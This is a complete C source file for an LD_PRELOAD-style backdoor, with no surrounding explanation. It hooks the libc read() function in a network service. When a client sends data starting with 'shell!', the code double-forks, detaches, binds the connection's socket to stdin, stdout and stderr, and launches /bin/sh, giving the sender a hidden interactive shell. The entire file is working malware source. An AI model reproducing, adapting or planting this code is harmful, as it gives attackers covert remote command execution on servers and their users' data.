#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/wait.h>

static void *dl;
ssize_t (*orig_read)(int, void *, size_t);

__attribute__((constructor)) void stub(void)
{
	dl = dlopen("/lib/libc.so.7", RTLD_LAZY | RTLD_GLOBAL);
	orig_read = dlsym(dl, "read");
	
}

void sigchld(int signo)
{
	while (waitpid(-1, NULL, WNOHANG) > 0)
		;
}

/*
 * Fork a shell and re-use the current socket
 */
ssize_t read(int socket, void *buffer, size_t length)
{
	ssize_t ret;
	FILE *fp;
	char filename[1024+1];
	
	ret = orig_read(socket, buffer, length);
	if (ret < strlen("shell!\n"))
		return ret;
	if (memcmp(buffer, "shell!", strlen("shell!")))
		return ret;
	
	if (fork())
		return 0;
	setsid();
	if (fork())
		return 0;
	
	dup2(socket, fileno(stdin));
	dup2(socket, fileno(stdout));
	dup2(socket, fileno(stderr));
	execl("/bin/sh", "sh", NULL);
	
	return -1;
}
